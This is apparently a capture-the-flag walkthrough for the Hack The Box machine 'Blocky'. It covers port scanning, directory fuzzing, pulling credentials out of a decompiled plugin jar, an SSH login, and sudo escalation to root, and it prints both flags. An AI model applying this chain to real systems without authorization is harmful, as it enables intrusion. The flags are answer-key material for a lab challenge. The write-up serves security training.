![Blocky.PNG](/assets/Machines/Easy/Blocky/Blocky.png)


1. Send an ICMP echo request to machine's IP address.
```bash
┌──(root㉿est)-[/home/kali]
└─| ping -c 2 10.10.10.37
```


2. Scan open ports with **nmap**.
```bash
┌──(root㉿kali)-[/home/kali]
└─| nmap -p- --open -vv -sS --min-rate 5000 -Pn -n 10.10.10.37
```

**Output**
```bash
PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
80/tcp    open  http
25565/tcp open  minecraft
```

3. Do virtual hosting (Put ip in **/etc/hosts**) and visit web page

![web.PNG](/assets/Machines/Easy/Blocky/web.PNG)


4. In this case we can watch who user post first publication

![user.PNG](/assets/Machines/Easy/Blocky/user.PNG)

5. Do directory fuzzing with wfuzz
```bash
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Blocky]
└─| wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt http://blocky.htb/FUZZ/
```

**Output**
```bash
=====================================================================                                                                  
ID           Response   Lines    Word       Chars       Payload                                                                        
=====================================================================                                                                  
                                                                                                                                       
000000224:   200        0 L      0 W        0 Ch        "wp-content"                                                                   
000000069:   403        11 L     32 W       291 Ch      "icons"                                                                
000000499:   200        37 L     61 W       745 Ch      "plugins"                                                              
000000176:   200        10 L     51 W       380 Ch      "wiki"                                                                 
000000752:   200        200 L    2015 W     40838 Ch    "wp-includes"                                                         
000001011:   403        11 L     32 W       296 Ch      "javascript"                                                          
000006668:   302        0 L      0 W        0 Ch        "wp-admin"                                                             
000010050:   200        25 L     347 W      10304 Ch    "phpmyadmin"
```

6. you can search in all previous directories, in this case the **plugins directory** have important information

![plugins.PNG](/assets/Machines/Easy/Blocky/plugins.PNG)

* Download **BlockyCore.jar**


7. Use `jd-gui` to watch code in **.jar** file (Command to install jd-gui: `apt install jd-gui`)

* Run **jd-gui**
```bash
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Blocky]
└─| jd-gui
```

**Output**

![jd-gui.PNG](/assets/Machines/Easy/Blocky/jd-gui.PNG)


* Open **BlockyCore.jar**

![creds.PNG](/assets/Machines/Easy/Blocky/creds.PNG)


8. With this credentials try to login with ssh (In this case use user **Notch**)
```bash
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Blocky]
└─| ssh notch@10.10.10.37
```

**Output**
```bash
notch@Blocky:~$ whoami
notch
```

9. Cat **user flag**
```bash
notch@Blocky:~$ cat user.txt 
288ed5ddf4b39a6b4a4d03c460193ac7
```

---
---
---
### **Privileges Escalation** 💀

1. Show groups of current user
```bash
notch@Blocky:~$ id
uid=1000(notch) gid=1000(notch) groups=1000(notch),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
```

* We stay in sudo group!

2. Login how root, put same password of user **Notch**
```bash
notch@Blocky:~$ sudo su
[sudo] password for notch: 
root@Blocky:/home/notch# whoami
root
```

3. Cat root flag
```bash
root@Blocky:/home/notch# cat /root/root.txt 
3cc207b3457e38cff33d4edc1c3c569az
```